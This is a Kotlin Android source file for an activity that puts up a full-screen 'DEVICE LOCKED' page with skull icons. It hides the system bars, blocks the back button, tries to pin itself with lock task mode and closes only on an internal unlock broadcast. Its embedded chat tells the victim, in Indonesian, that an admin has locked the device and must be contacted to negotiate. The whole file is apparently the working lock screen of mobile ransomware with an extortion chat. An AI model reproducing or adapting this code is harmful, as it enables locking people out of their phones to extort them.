package com.fantzy.nih

import android.annotation.SuppressLint
import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.WindowInsets
import android.view.WindowInsetsController
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient

class LockChatLive : Activity() {

    companion object {
        var currentInstance: LockChatLive? = null
    }

    private lateinit var webView: WebView
    private var isReceiverRegistered = false
    var isUnlocked = false

    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            if (intent.action == "com.fantzy.nih.UNLOCK") {
                isUnlocked = true
                finish()
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        try {
            currentInstance = this

            setupImmersiveMode()
            setupWebView()
            registerUnlockReceiver()

            try {
                val dpm = getSystemService(DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                if (dpm.isLockTaskPermitted(packageName)) {
                    try {
                        startLockTask()
                    } catch (e: Exception) {
                        Log.w("LockChatLive", "startLockTask failed: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                Log.w("LockChatLive", "DevicePolicy access error: ${e.message}")
            }
        } catch (e: Exception) {
            Log.e("LockChatLive", "onCreate error: ${e.message}", e)
            try {
                finish()
            } catch (_: Exception) {}
        }
    }

    private fun setupImmersiveMode() {
        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            window.insetsController?.hide(WindowInsets.Type.statusBars() or WindowInsets.Type.navigationBars())
            window.insetsController?.systemBarsBehavior = WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        } else {
            @Suppress("DEPRECATION")
            window.decorView.systemUiVisibility = (
                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                            or View.SYSTEM_UI_FLAG_FULLSCREEN
                            or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                    )
        }
    }

    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (!isUnlocked) {
            setupImmersiveMode()
        }
    }

    override fun onBackPressed() {
        if (!isUnlocked) return
        super.onBackPressed()
    }

    override fun onDestroy() {
        super.onDestroy()
        currentInstance = null
        try { stopLockTask() } catch (_: Exception) {}
        if (isReceiverRegistered) {
            try { unregisterReceiver(unlockReceiver) } catch (_: Exception) {}
            isReceiverRegistered = false
        }
        try {
            if (::webView.isInitialized) {
                webView.loadUrl("about:blank")
                webView.stopLoading()
                webView.removeAllViews()
                webView.destroy()
            }
        } catch (e: Exception) {
            Log.w("LockChatLive", "Cleanup error: ${e.message}")
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        try {
            webView = WebView(this)
            webView.settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
            }
            webView.setBackgroundColor(Color.TRANSPARENT)
            webView.webViewClient = WebViewClient()
            webView.addJavascriptInterface(ChatBridge(), "NativeBridge")
            webView.loadDataWithBaseURL(null, buildLiveChatHtml(), "text/html", "UTF-8", null)
            setContentView(webView)
        } catch (e: Exception) {
            Log.e("LockChatLive", "setupWebView error: ${e.message}")
        }
    }

    private fun registerUnlockReceiver() {
        if (isReceiverRegistered) return
        try {
            val filter = IntentFilter("com.fantzy.nih.UNLOCK")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(unlockReceiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(unlockReceiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.w("LockChatLive", "registerReceiver: ${e.message}")
        }
    }

    fun receiveMessage(name: String, text: String) {
        try {
            val safeFrom = name.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
            val safeText = text.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")
            val jsCode = "javascript:receiveMessage('$safeFrom', '$safeText')"
            
            runOnUiThread {
                try {
                    if (!isFinishing && !isDestroyed && ::webView.isInitialized) {
                        webView.evaluateJavascript(jsCode) { }
                    }
                } catch (e: Exception) {
                    Log.w("LockChatLive", "receiveMessage error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e("LockChatLive", "receiveMessage error: ${e.message}")
        }
    }

    inner class ChatBridge {
        @JavascriptInterface
        fun sendChat(message: String) {
            try {
                if (message.isBlank()) return
                val intent = Intent("com.fantzy.nih.SEND_CHAT_MSG").apply {
                    putExtra("message", message)
                    setPackage(packageName)
                }
                sendBroadcast(intent)
            } catch (e: Exception) {
                Log.w("LockChatLive", "sendChat error: ${e.message}")
            }
        }

        @JavascriptInterface
        fun getStatus(): String {
            return try {
                if (SocketHolder.connected) "online" else "offline"
            } catch (e: Exception) {
                "offline"
            }
        }
    }

    private fun buildLiveChatHtml(): String {
        return """
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    :root {
        --bg-yellow: #FFE600;
        --card-bg: #FFFFFF;
        --black: #000000;
        --red: #FF2E4C;
        --cyan: #00F0FF;
        --green: #00FF66;
    }
    body {
        background-color: var(--bg-yellow);
        background-image: radial-gradient(var(--black) 2px, transparent 2px);
        background-size: 20px 20px;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        height: 100vh;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }
    .header {
        background: var(--black);
        color: var(--bg-yellow);
        padding: 15px;
        border-bottom: 4px solid var(--black);
        box-shadow: 0 4px 0 var(--red);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10;
    }
    .header-content {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 12px;
        flex: 1;
    }
    .header h1 {
        font-size: 18px;
        font-weight: 900;
        letter-spacing: 1px;
        text-transform: uppercase;
        text-align: center;
    }
    .skull-icon {
        font-size: 20px;
    }
    .status-dot {
        width: 12px;
        height: 12px;
        background: var(--green);
        border: 2px solid var(--black);
        box-shadow: 2px 2px 0 var(--black), 0 0 8px var(--green);
        border-radius: 50%;
        position: absolute;
        right: 15px;
    }
    .chat-container {
        flex: 1;
        padding: 15px;
        overflow-y: auto;
        display: flex;
        flex-direction: column;
        gap: 12px;
        background: #e0e0e0;
    }
    .bubble {
        max-width: 80%;
        padding: 12px 16px;
        border: 3px solid var(--black);
        box-shadow: 4px 4px 0 var(--black);
        border-radius: 12px;
        font-size: 15px;
        line-height: 1.4;
        word-wrap: break-word;
    }
    .bubble.admin {
        background: var(--card-bg);
        align-self: flex-start;
        border-bottom-left-radius: 4px;
    }
    .bubble.admin::before {
        content: "ADMIN";
        position: absolute;
        top: -10px;
        left: 0;
        background: var(--red);
        color: #fff;
        font-size: 10px;
        font-weight: 800;
        padding: 2px 8px;
        border: 2px solid var(--black);
        border-radius: 4px;
    }
    .bubble.user {
        background: var(--cyan);
        align-self: flex-end;
        border-bottom-right-radius: 4px;
    }
    .bubble.user::before {
        content: "YOU";
        position: absolute;
        top: -10px;
        right: 0;
        background: var(--black);
        color: #fff;
        font-size: 10px;
        font-weight: 800;
        padding: 2px 8px;
        border-radius: 4px;
    }
    .time-stamp {
        font-size: 10px;
        color: #666;
        text-align: right;
        margin-top: 4px;
        font-weight: 600;
    }
    .input-area {
        background: var(--card-bg);
        padding: 15px;
        border-top: 4px solid var(--black);
        display: flex;
        gap: 10px;
    }
    .input-area input {
        flex: 1;
        padding: 12px 16px;
        border: 3px solid var(--black);
        box-shadow: 4px 4px 0 var(--black);
        border-radius: 10px;
        font-size: 15px;
        font-weight: 600;
        outline: none;
    }
    .input-area button {
        background: var(--black);
        color: var(--bg-yellow);
        border: 3px solid var(--black);
        box-shadow: 4px 4px 0 var(--red);
        border-radius: 10px;
        padding: 0 20px;
        font-weight: 900;
        font-size: 16px;
        cursor: pointer;
        text-transform: uppercase;
    }
</style>
</head>
<body>
<div class="header">
    <div class="header-content">
        <span class="skull-icon">☠</span>
        <h1>DEVICE LOCKED</h1>
        <span class="skull-icon">☠</span>
    </div>
    <div class="status-dot" id="statusIndicator"></div>
</div>
<div class="chat-container" id="chatBox">
    <div class="bubble admin">
        <div class="msg-text">Perangkat Anda Telah Di Kunci Oleh Admin. Chat Admin Untuk Bernegosiasi</div>
        <div class="time-stamp">Just now</div>
    </div>
</div>
<div class="input-area">
    <input type="text" id="msgInput" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')sendChat()" />
    <button onclick="sendChat()">Kirim</button>
</div>
<script>
    function getTime() {
        const now = new Date();
        let h = now.getHours().toString().padStart(2, '0');
        let m = now.getMinutes().toString().padStart(2, '0');
        return h + ':' + m;
    }
    function appendMessage(name, text, type) {
        const box = document.getElementById('chatBox');
        const div = document.createElement('div');
        div.className = 'bubble ' + type;
        div.innerHTML = '<div class="msg-text">' + text.replace(/</g, '&lt;').replace(/>/g, '&gt;') + '</div><div class="time-stamp">' + getTime() + '</div>';
        box.appendChild(div);
        box.scrollTop = box.scrollHeight;
    }
    function receiveMessage(name, text) {
        appendMessage(name, text, 'admin');
    }
    function sendChat() {
        const input = document.getElementById('msgInput');
        const text = input.value.trim();
        if (!text) return;
        appendMessage('You', text, 'user');
        input.value = '';
        if (typeof NativeBridge !== 'undefined') {
            NativeBridge.sendChat(text);
        }
    }
    setInterval(() => {
        if (typeof NativeBridge !== 'undefined') {
            const status = NativeBridge.getStatus();
            const dot = document.querySelector('#statusIndicator');
            if(dot) {
                dot.style.background = status === "online" ? "var(--green)" : "var(--red)";
            }
        }
    }, 5000);
</script>
</body>
</html>
        """.trimIndent()
    }
}
